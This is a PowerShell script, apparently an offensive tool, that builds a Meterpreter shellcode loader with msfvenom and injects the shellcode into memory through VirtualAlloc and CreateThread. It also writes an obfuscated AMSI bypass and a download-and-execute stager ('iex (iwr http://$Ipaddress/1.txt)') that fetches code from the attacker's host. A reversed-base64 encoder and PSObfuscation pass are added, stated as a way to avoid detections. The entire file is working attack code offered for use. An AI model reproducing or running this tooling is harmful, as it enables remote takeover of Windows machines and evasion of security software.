
#Parameters

$payload = $args[0];
$Ipaddress = $args[1];
$Port = $args[2];
Write-Host "Processing. ";

#Make meterpreter payload (Change accordingly):

$command = "msfvenom -p $payload LHOST=$Ipaddress LPORT=$Port -f ps1";
$output = & pwsh -Command $command

# Print the output
#Write-Output $output
$Make = @"

function LookupFunc {

  Param (`$moduleName, `$functionName)
  `$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |  Where-Object { `$_.GlobalAssemblyCache -And `$_.Location.Split('\\')[-1].
  Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
`$tmp=@()
`$assem.GetMethods() | ForEach-Object {If(`$_.Name -eq "GetProcAddress") {`$tmp+=`$_}}
return `$tmp[0].Invoke(`$null, @((`$assem.GetMethod('GetModuleHandle')).Invoke(`$null, @(`$moduleName)), `$functionName))
}

function getDelegateType {

  Param (
      [Parameter(Position = 0, Mandatory = `$True)] [Type[]] `$func,
      [Parameter(Position = 1)] [Type] `$delType = [Void]
  )

  `$type = [AppDomain]::CurrentDomain.
  DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
  [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
  DefineDynamicModule('InMemoryModule', `$false).
  DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
  [System.MulticastDelegate])

  `$type.
  DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, `$func).
  SetImplementationFlags('Runtime, Managed')

  `$type.
  DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', `$delType, `$func).
  SetImplementationFlags('Runtime, Managed')

  return `$type.CreateType()


}

#Getting VirtualAlloc
`$VirtualAllocHandle = LookupFunc 'kernel32.dll' 'VirtualAlloc'
`$VirtualAllocDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
`$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`$VirtualAllocHandle, `$VirtualAllocDelegateType)
#Calling VirtualAlloc to allocate a space in memory.
`$Mem = `$VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
"@


# Display the content of the $Make variable
#$Write-Output $Make



$Make2 = @"
#Copy shellcode to executable buffer space
[System.Runtime.InteropServices.Marshal]::Copy(`$buf, 0, `$Mem, `$buf.length)

#CreateThread.
`$CreateThreadHandle = LookupFunc 'kernel32.dll' 'CreateThread'
`$CreateThreadDelegateType = getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]) 
`$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`$CreateThreadHandle, `$CreateThreadDelegateType)
#Execute our buffer space.
`$thread = `$CreateThread.Invoke([IntPtr]::Zero, 0, `$Mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

#WaitForSingleObject
`$WaitForSingleObjectHandle = LookupFunc 'kernel32.dll' 'WaitForSingleObject'
`$WaitForSingleObjectDelegateType = getDelegateType @([IntPtr], [Int32]) ([Int])
`$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`$WaitForSingleObjectHandle, `$WaitForSingleObjectDelegateType)

`$Wait = `$WaitForSingleObject.Invoke(`$thread, 0xFFFFFFFF)
"@

$Make = $Make + "`n" +$output + "`n" + $Make2

# Get the current directory
$currentDir = $PSScriptRoot

# Specify the filename for the new file
$fileName = "output-file.ps1"

# Combine the current directory and filename to create the file path
$filePath = Join-Path -Path $currentDir -ChildPath $fileName

# Escape the dollar signs in the multiline code
$escapedMake = $Make -replace '_$', '`$'

# Write the content to the new file
$escapedMake | Set-Content -Path $filePath

# Display a confirmation message
#Write-Host "Multi-line code written to '$filePath'."


$ams_iBypass = @"
#ams_i bypass
[ReF]."``A`$(echo sse)``mB`$(echo L)``Y"."g``E`$(echo tty)p``E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils"-f'iUt','gement.A',"on.Am``s",'stem.M','oma') )."`$(echo ge)``Tf``i`$(echo El)D"(("{0}{2}ni{1}iled"-f'am','tFa',"``siI"),("{2}ubl{0}``,{1}{0}"-f'ic','Stat','NonP'))."`$(echo Se)t``Va`$(echo LUE)"(`$(),`$(1-eq1)) 
"@

# Display the content of the `$ams_iBypass` variable
#Write-Output $ams_iBypass

#shell
#change ip accordingly.
$make3 = @"
iex (iwr http://$Ipaddress/1.txt -UseBasicParsing);
"@

$file1 = $ams_iBypass + "`n" + $make3

#Write-Output $file1



# Get the current directory
$currentDir = $PSScriptRoot

# Specify the filename for the new file
$fileName1 = "test.ps1"

# Combine the current directory and filename to create the file path
$filePath = Join-Path -Path $currentDir -ChildPath $fileName1

# Write the content to the new file
$file1 | Set-Content -Path $filePath

# Display a confirmation message
#Write-Host "Multi-line code written to '$filePath'."



#Write-Host $PSobfuscation

#Revb64 output-file.ps1
$InvokePath = Join-Path -Path $currentDir -ChildPath "output-file.ps1"

function Rev64-Encoder {
  Write-Host "[+] Encoding with base64 and reverse it to avoid detections.. " -ForegroundColor Blue -NoNewline
  $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($InvokePath)) ; $b64 = "`"$base64`""
  $base64rev = $b64.ToCharArray() ; [array]::Reverse($base64rev) ; $best64 = -join $base64rev | out-file $InvokePath
  $content = Get-Content $InvokePath ; Clear-Content $InvokePath ; Add-Content $InvokePath '$best64code = ' -NoNewline ; Add-Content $InvokePath "$content ;"
  Add-Content $InvokePath '$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;'
  $RandomCode = '$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64")) ;'
  $RandomCode = ($RandomCode -split "" | %{if(@(0..1) | Get-Random){$_.toUpper()}else{$_.toLower()}}) -join "" ; Add-Content $InvokePath $RandomCode
  $RandomIEX = (("iN"+"voK"+"e"+"-"+"eXP"+"re"+"sSi"+"oN" -split "(.{$(Get-Random(1..3))})" -ne "" | % { '"' + $_ + '"' + "+" }) -join "").toString().trimend("+")
  $RandomCode = '$pwn = ' + $RandomIEX + ' ; New-Alias -name pwn -Value $pwn -Force ; pwn $LoadCode ;'
  $RandomCode = ($RandomCode -split "" | %{if(@(0..1) | Get-Random){$_.toUpper()}else{$_.toLower()}}) -join "" ; Add-Content $InvokePath $RandomCode
  Write-Host "[OK]" -ForegroundColor Green ; Write-Host }
  
Rev64-Encoder


#PSobfuscate output-file.ps1

Write-Host "[+] Loading PSObfuscation and randomizing script.. " -ForegroundColor Blue -NoNewline
Import-Module $currentDir/Invoke-PSObfuscation.ps1 -Force
#writes output to 1.txt
$PSobfuscation = Invoke-PSObfuscation -Path $currentDir/output-file.ps1 -Comments -Variables -OutFile $currentDir/1.txt
Write-Host "[OK]" -ForegroundColor Green ; Write-Host 


Write-Host "`nOutput files: $fileName, 1.txt"